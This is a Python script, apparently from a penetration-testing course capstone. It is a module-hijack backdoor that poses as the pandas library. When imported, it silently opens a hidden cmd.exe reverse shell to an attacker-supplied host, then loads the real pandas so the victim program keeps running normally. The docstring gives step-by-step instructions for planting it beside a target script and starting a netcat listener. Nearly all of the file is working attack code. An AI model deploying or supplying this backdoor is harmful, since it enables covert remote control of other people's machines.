#!/usr/bin/env python3
"""
Script: malicious_pandas.py
Module: 11 — Assembling The Pieces (Capstone)
Purpose: Python module hijack — masquerades as pandas, establishes reverse shell,
         then re-imports the real pandas so the target script continues normally.
Usage:   Drop as 'pandas.py' in the SAME DIRECTORY as the target Python script.
         Python's import resolution checks CWD before site-packages, so this file
         loads instead of the real pandas package.
Target:  genai-workstation01 — any Python process that imports pandas

Deployment:
  1. Find where the target script runs from (check scheduled task, service config, or process CWD)
  2. Drop this file as pandas.py in that directory
  3. Start listener: rlwrap nc -lvnp <LPORT>
  4. Wait for the process to restart / re-run (or trigger it)

IMPORTANT: Replace LHOST and LPORT before deploying.
"""

import os
import sys
import socket
import subprocess
import threading


LHOST = "<LHOST>"   # Replace with attacker IP
LPORT = <LPORT>     # Replace with attacker port (int)


def _reverse_shell():
    """Open reverse shell to attacker. Runs in a non-daemon thread so the
    process stays alive even if the main script finishes."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST, LPORT))

        # Spawn cmd.exe with hidden window
        p = subprocess.Popen(
            ["cmd.exe"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            creationflags=0x08000000,   # CREATE_NO_WINDOW
        )

        # Forward stdout/stderr → socket
        def _read_proc():
            while True:
                data = p.stdout.read(1)
                if not data:
                    break
                s.send(data)

        threading.Thread(target=_read_proc, daemon=True).start()

        # Forward socket → stdin
        while True:
            data = s.recv(4096)
            if not data:
                break
            p.stdin.write(data)
            p.stdin.flush()

        p.kill()
        s.close()
    except Exception:
        pass  # Silently fail — don't crash the target process


# Start shell in a NON-daemon thread so the process stays alive
threading.Thread(target=_reverse_shell).start()

# ── Re-import real pandas so the target script doesn't crash ──────────────────
# Remove this file's directory from sys.path before importing,
# then restore it afterwards so future imports still work.

_this_dir = os.path.dirname(os.path.abspath(__file__))

# Strip this directory from path
sys.path = [
    p for p in sys.path
    if p and os.path.normcase(os.path.abspath(p)) != os.path.normcase(_this_dir)
]

# Remove our fake module from the cache
del sys.modules["pandas"]

# Import the real thing
import importlib
sys.modules["pandas"] = importlib.import_module("pandas")

# Restore our directory at the front (keeps future local imports working)
sys.path.insert(0, _this_dir)
